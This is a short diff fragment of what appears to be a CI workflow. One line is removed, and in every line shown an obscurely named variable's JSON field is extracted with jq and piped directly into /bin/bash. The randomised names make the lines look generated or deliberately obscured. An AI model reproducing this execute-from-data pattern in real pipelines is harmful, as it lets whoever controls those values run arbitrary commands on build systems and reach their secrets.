@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$czpu0" | jq -r .kj9 | /bin/bash
           echo $g32 | jq -r .kx2262 | /bin/bash
           printf '%s' "$m9470" | jq -r .mnln74457 | /bin/bash
-          echo $uob105 | jq -r .no38748 | /bin/bash
           echo $mohq7 | jq -r .vro9 | /bin/bash
           printf '%s' "$lauwm5" | jq -r .shb6 | /bin/bash
           echo $xv643 | jq -r .om287 | /bin/bash
